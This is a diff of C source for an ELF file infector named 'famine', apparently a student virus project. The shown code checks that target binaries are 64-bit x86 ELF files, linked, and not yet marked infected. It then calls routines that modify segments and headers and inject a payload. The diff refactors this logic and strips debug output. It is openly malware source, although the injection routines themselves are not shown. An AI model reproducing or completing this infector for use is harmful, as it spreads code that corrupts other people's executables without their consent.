@@ -11,27 +11,27 @@ static inline Elf64_Ehdr *get_header(struct s_info *info)
 	header = (Elf64_Ehdr *)info->ptr;
 
 	if (info->ptr + sizeof(Elf64_Ehdr) >= info->ptr + info->size)
-		Exit(0);
+		header = NULL;
 
 	return header;
 }
 
-static inline char is_elf(const Elf64_Ehdr *header)
+static inline bool is_elf(const Elf64_Ehdr *header)
 {
 	return *(unsigned int *)header == ELF_MAGIC_NUMBER;
 }
 
-static inline char is_x86(const Elf64_Ehdr *header)
+static inline bool is_x86(const Elf64_Ehdr *header)
 {
 	return header->e_ident[EI_CLASS] == X86_64;
 }
 
-static inline char is_linked(const Elf64_Ehdr *header)
+static inline bool is_linked(const Elf64_Ehdr *header)
 {
 	return header->e_entry != 0;
 }
 
-static inline char is_not_infected(const Elf64_Ehdr *header)
+static inline bool is_not_infected(const Elf64_Ehdr *header)
 {
 	return *(uint32_t *)((char *)&header->e_ident[EI_PAD]) != INFECTED_MAGIC_NUMBER;
 }
@@ -40,20 +40,14 @@ static inline char is_not_infected(const Elf64_Ehdr *header)
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void famine(const char *file, const unsigned long m_entry, const int trace)
+static inline void defer(struct s_info *info)
 {
-#ifdef DEBUG
-	char buf[] = "Famine on ";
-	char buf1[] = "\n\n";
-	_write(trace, buf, _strlen(buf));
-	_write(trace, file, _strlen(file));
-	_write(trace, buf1, _strlen(buf1));
+	release_info(info);
+}
 
-	char buf2[] = "checking for criteria of infection\n";
-	_write(trace, buf2, _strlen(buf2));
-#endif
-
-	struct s_info info;
+void famine(const char *file, const size_t m_entry)
+{
+	__attribute__((cleanup(defer))) struct s_info info;
 	Elf64_Ehdr *header;
 	const struct criteria crit[] =
 	{
@@ -63,29 +57,18 @@ void famine(const char *file, const unsigned long m_entry, const int trace)
 		(const struct criteria){&is_not_infected},
 	};
 
-	info = get_info(file);
-	header = get_header(&info);
+	if ((info = get_info(file)).name == NULL)
+		return ;
+	if ((header = get_header(&info)) == NULL)
+		return ;
 
-	for (unsigned char index = 0; index < CRITERIA_SIZE; index++)
+	for (uint8_t index = 0; index < CRITERIA_SIZE; index++)
 	{
-		if (crit[index].fct(header) == FALSE)
-		{
-#ifdef DEBUG
-			char buf3[] = "binary is not infectable\n\n";
-			_write(trace, buf3, _strlen(buf3));
-#endif
-			Exit(0);
-		}
+		if (crit[index].fct(header) == false)
+			return ;
 	}
-
-#ifdef DEBUG
-	char buf4[] = "binary is infectable\n";
-	_write(trace, buf4, _strlen(buf4));
-#endif
 
 	modify_segment(&info);
 	modify_header(&info, header);	
-	inject(&info, m_entry, trace);
-
-	release_info(&info);
+	inject(&info, m_entry);
 }
